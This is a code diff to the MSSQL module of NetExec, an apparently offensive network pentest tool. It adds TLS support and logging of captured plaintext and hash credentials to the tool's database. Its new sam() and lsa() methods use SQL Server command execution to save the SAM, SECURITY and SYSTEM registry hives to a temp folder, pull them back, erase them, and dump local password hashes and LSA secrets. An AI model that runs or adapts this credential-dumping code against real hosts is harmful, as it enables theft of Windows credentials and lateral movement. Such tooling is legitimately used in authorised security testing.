@@ -1,12 +1,12 @@
 import os
 import random
-import socket
 import contextlib
-from io import StringIO
+from termcolor import colored
 
-from nxc.config import process_secret
+from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.connection import requires_admin
+from nxc.helpers.misc import gen_random_string
 from nxc.logger import NXCAdapter
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.ntlm_parser import parse_challenge
@@ -27,7 +27,10 @@ from impacket.tds import (
     TDS_ENVCHANGE_LANGUAGE,
     TDS_ENVCHANGE_CHARSET,
     TDS_ENVCHANGE_PACKETSIZE,
+    TDS_ENCRYPT_REQ,
+    TDS_ENCRYPT_OFF
 )
+from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 
 
 class mssql(connection):
@@ -56,16 +59,11 @@ class mssql(connection):
     def create_conn_obj(self):
         try:
             self.conn = tds.MSSQL(self.host, self.port, self.remoteName)
-            # Default has not timeout option in tds.MSSQL.connect() function, let rewrite it.
-            af, socktype, proto, canonname, sa = socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM)[0]
-            sock = socket.socket(af, socktype, proto)
-            sock.settimeout(self.args.mssql_timeout)
-            sock.connect(sa)
-            self.conn.socket = sock
-            if not self.is_mssql:
-                self.conn.preLogin()
+            self.conn.connect(self.args.mssql_timeout)
         except Exception as e:
             self.logger.debug(f"Error connecting to MSSQL service on host: {self.host}, reason: {e}")
+            with contextlib.suppress(Exception):
+                self.conn.disconnect()
             return False
         else:
             self.is_mssql = True
@@ -93,7 +91,16 @@ class mssql(connection):
     @reconnect_mssql
     def enum_host_info(self):
         challenge = None
+
         try:
+            # If the MSSQL Server responds with a TDS_ENCRYPT_REQ or TDS_ENCRYPT_OFF then we need to setup a TLS context
+            resp = self.conn.preLogin()
+            self.encryption = False
+            if resp["Encryption"] == TDS_ENCRYPT_REQ or resp["Encryption"] == TDS_ENCRYPT_OFF:
+                # We switch to a TLS context handled by tds.py
+                self.conn.set_tls_context()
+                self.encryption = True
+
             login = tds.TDS_LOGIN()
             login["HostName"] = ""
             login["AppName"] = ""
@@ -114,9 +121,14 @@ class mssql(connection):
             # Send the NTLMSSP Negotiate or SQL Auth Packet
             self.conn.sendTDS(tds.TDS_LOGIN7, login.getData())
 
+            # According to the specs, if encryption is TDS_ENCRYPT_OFF, we must encrypt the first Login packet
+            if resp["Encryption"] == TDS_ENCRYPT_OFF:
+                self.encryption = False
+                self.conn.tlsSocket = None
+
             tdsx = self.conn.recvTDS()
             challenge = tdsx["Data"][3:]
-            self.logger.info(f"NTLM challenge: {challenge!s}")
+            self.logger.debug(f"NTLM challenge: {challenge!s}")
         except Exception as e:
             self.logger.info(f"Failed to receive NTLM challenge, reason: {e!s}")
             return False
@@ -141,7 +153,8 @@ class mssql(connection):
             self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")
 
     def print_host_info(self):
-        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain})")
+        encryption = colored(f"EncryptionReq:{self.encryption}", host_info_colors[0 if self.encryption else 1], attrs=["bold"])
+        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain}) ({encryption})")
 
     @reconnect_mssql
     def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
@@ -165,7 +178,7 @@ class mssql(connection):
             username = ccache.credentials[0].header["client"].prettyPrint().decode().split("@")[0]
             self.username = username
 
-        used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
+        used_ccache = " from ccache" if useCache else f"{process_secret(kerb_pass)}"
         try:
             res = self.conn.kerberosLogin(
                 None,
@@ -206,9 +219,15 @@ class mssql(connection):
                 raise
             self.check_if_admin()
             self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
+            self.db.add_credential("plaintext", self.domain, self.username, self.password)
+            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
+            host_id = self.db.get_hosts(self.host)[0].id
+            self.db.add_loggedin_relation(user_id, host_id)
+
             if not self.args.local_auth and self.username != "":
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             if self.admin_privs:
+                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", self.domain, self.logger, self.config)
             return True
         except BrokenPipeError:
@@ -237,9 +256,15 @@ class mssql(connection):
                 raise
             self.check_if_admin()
             self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}")
+            self.db.add_credential("hash", self.domain, self.username, self.nthash)
+            user_id = self.db.get_credential("hash", domain, self.username, self.nthash)
+            host_id = self.db.get_hosts(self.host)[0].id
+            self.db.add_loggedin_relation(user_id, host_id)
+
             if not self.args.local_auth and self.username != "":
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             if self.admin_privs:
+                self.db.add_admin_user("hash", domain, self.username, self.nthash, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", self.domain, self.logger, self.config)
             return True
         except BrokenPipeError:
@@ -250,25 +275,25 @@ class mssql(connection):
             self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {error_msg if error_msg else ''}")
             return False
 
-    def mssql_query(self):
+    def query(self):
         if self.conn.lastError:
             # Invalid connection
+            self.logger.debug(f"Cannot execute query due to invalid connection: {self.conn.lastError}")
             return None
-        query = self.args.mssql_query
-        self.logger.info(f"Query to run:\n{query}")
+        self.logger.info(f"Query to run: {self.args.query}")
         try:
-            raw_output = self.conn.sql_query(query)
-            self.logger.info("Executed MSSQL query")
+            raw_output = self.conn.sql_query(self.args.query)
             self.logger.debug(f"Raw output: {raw_output}")
-            for data in raw_output:
-                if isinstance(data, dict):
+            if self.conn.lastError:
+                self.logger.debug(f"Error during query execution: {self.conn.lastError}")
+                self.logger.fail(self.conn.lastError)
+            else:
+                for data in raw_output:
                     for key, value in data.items():
                         if key:
                             self.logger.highlight(f"{key}:{value}")
                         else:
                             self.logger.highlight(f"{value}")
-                else:
-                    self.logger.fail("Unexpected output")
         except Exception as e:
             self.logger.exception(f"Failed to excuted MSSQL query, reason: {e}")
             return None
@@ -284,6 +309,7 @@ class mssql(connection):
         get_output = True if not self.args.no_output else get_output
         self.logger.debug(f"{get_output=}")
 
+        output = ""
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
             output = exec_method.execute(payload)
@@ -292,10 +318,11 @@ class mssql(connection):
             self.logger.fail(f"Execute command failed, error: {e!s}")
             return False
         else:
-            self.logger.success("Executed command via mssqlexec")
-            if output:
-                output_lines = StringIO(output).readlines()
-                for line in output_lines:
+            if self.conn.lastError:
+                self.logger.fail(f"Error during command execution: {self.conn.lastError}")
+            else:
+                self.logger.success("Executed command via mssqlexec")
+                for line in output.splitlines():
                     self.logger.highlight(line.strip())
         return output
 
@@ -506,3 +533,70 @@ class mssql(connection):
                 self.logger.highlight(f"{r.get('TableName', ''):<50} {mod!s:<25}")
             self.logger.highlight(f"Total: {len(rows)} table(s)")
             return
+
+    @requires_admin
+    def sam(self):
+        sam_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="sam")
+        try:
+            exec_method = MSSQLEXEC(self.conn, self.logger)
+            exec_method.execute(dump_command)
+            exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump SAM database, error: {e!s}")
+            self.logger.debug(f"Error dumping SAM: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.sam") and os.path.getsize(f"{output_filename}.sam") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SAM or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            self.logger.display("Dumping SAM hashes")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            SAM = SAMHashes(
+                f"{output_filename}.sam",
+                boot_key,
+                isRemote=None,
+                perSecretCallback=lambda secret: self.logger.highlight(secret),
+            )
+            SAM.dump()
+            SAM.export(output_filename)
+
+    @requires_admin
+    def lsa(self):
+        security_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="lsa")
+        try:
+            exec_method = MSSQLEXEC(self.conn, self.logger)
+            exec_method.execute(dump_command)
+            exec_method.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
+            self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.security") and os.path.getsize(f"{output_filename}.security") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SECURITY or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            self.logger.display("Dumping LSA secrets")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            LSA = LSASecrets(
+                f"{output_filename}.security",
+                boot_key,
+                None,
+                isRemote=None,
+                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+            )
+            LSA.dumpCachedHashes()
+            LSA.dumpSecrets()
